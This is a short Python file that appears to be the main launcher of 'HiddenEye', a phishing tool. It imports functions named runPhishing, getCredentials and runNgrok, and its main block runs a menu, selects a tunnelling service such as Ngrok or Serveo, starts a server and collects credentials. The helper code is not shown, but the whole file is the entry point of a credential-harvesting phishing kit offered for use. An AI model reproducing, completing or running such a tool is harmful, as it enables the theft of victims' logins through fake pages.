#HiddenEye by Open Source Community
import multiprocessing
from Defs.Checks import checkConnection, checkNgrok
from Defs.Configurations import createConfig, readConfig, ifSettingsNotExists
from Defs.Actions import runPhishing, selectServer, runNgrok, runServeo, runMainMenu, inputCustom, runServer, endMessage, getCredentials, writeLog



RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'

checkConnection()
checkNgrok()

ifSettingsNotExists()
readConfig()
config = readConfig()


if __name__ == "__main__":
    try:
        runMainMenu()

        inputCustom()
        ##############
        selectServer()

        multiprocessing.Process(target=runServer).start()
        getCredentials()

    except KeyboardInterrupt:
        endMessage()
        exit(0)
